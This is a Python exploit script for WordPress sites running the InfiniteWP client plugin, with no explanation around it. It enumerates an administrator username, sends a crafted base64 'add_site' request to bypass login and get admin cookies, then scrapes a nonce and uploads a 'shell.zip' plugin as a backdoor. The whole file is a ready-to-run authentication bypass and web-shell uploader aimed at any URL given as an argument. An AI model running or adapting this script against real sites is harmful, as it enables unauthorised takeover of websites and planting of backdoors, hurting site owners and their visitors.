# -*- coding: utf-8 -*-
import requests, base64, json, sys, re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


print("\tiWP Auth Bypass + Shell Upload | ./Xi4u7 - Jiwa Terlena Team\n")
def enum(url):
	headers = {"User-agent":"Linux Mozilla"}
	try:
		r = requests.get(url + "/?author=1", verify=False, allow_redirects=False)
		if r.status_code == 301:
			user = re.findall(r"/author/(.*?)/", r.headers["Location"])[0]
			return user
		else:
			x = requests.get(url+"/wp-json/wp/v2/users", verify=False, headers=headers).text
			user = json.loads(x)[0]["slug"]
			if user:
				return user
			else:
				return False
	except Exception as err:
		print(err)
		return False

def exploit(url):
	cookies = None
	s = requests.Session()
	user = enum(url)
	if user:
		payload = base64.b64encode(json.dumps({"iwp_action": "add_site","id": 1,"params": {"username": user}}).encode())
		payload = "_IWP_JSON_PREFIX_%s" % (payload.decode())
		try:
			headers = {"User-Agent": "Mozilla","Cookie": cookies}
			r = s.post(url, data=payload, verify=False)
			print("Target\t: \033[32;1m"+url+"\033[0m")
			print("User\t: \033[32;1m"+user+"\033[0m")
			if "<IWPHEADER>" in r.text:
				print("Trigger\t: \033[32;1mTrue\033[0m")
				print("Cookies\t: \033[32;1m"+r.headers["Set-Cookie"]+"\033[0m")
				r3 = s.get(url + '/wp-admin/plugin-install.php?tab=upload', verify=False)
				look_for = 'name="_wpnonce" value="'
				nonceText = r3.text.split(look_for, 1)[1]
				nonce = nonceText[0:10]
				print("Nonce\t: \033[32;1m"+nonce+"\033[0m")
				files = {'pluginzip': open('shell.zip', 'rb'),'_wpnonce': (None, nonce),'_wp_http_referer': (None, url + '/wp-admin/plugin-install.php?tab=upload'),'install-plugin-submit': (None,'Install Now')}
				r4 = s.post(url + "/wp-admin/update.php?action=upload-plugin",files=files, verify=False)
				if r4.status_code == 200:
					print("\033[32;1mbackdoor uploaded\033[0m")
				else:
					print("\033[31;1mCan't upload backdoor\033[0m")
			else:
				print("Trigger\t: \033[31;1mFalse\033[0m")
		except Exception as err:
			print("Error\t: \033[31;1m"+str(err)+"\033[0m")
	else:
		print("\033[31;1mCan't enum username.\033[0m")
	s.close()
try:
	trgt = sys.argv[1]
except:
	print("python iWP.py http://target.com/")
	exit()
exploit(trgt)
